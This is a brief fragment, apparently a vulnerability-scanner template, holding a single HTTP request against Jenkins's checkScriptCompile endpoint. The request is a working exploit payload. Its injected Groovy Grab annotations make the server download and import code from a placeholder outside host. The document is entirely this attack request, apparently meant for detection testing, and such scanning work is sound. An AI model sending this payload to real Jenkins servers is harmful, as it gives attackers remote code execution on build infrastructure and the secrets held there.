# Vulnerable: ITS-142
GET /securityRealm/user/{{to_lower(username)}}/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(%27http%3a%2f%2f{{interactsh-url}}%2f%27)%0a@Grab(%27{{vendor_name}}:{{app_name}}:1%27)%0aimport%20{{app_name}};
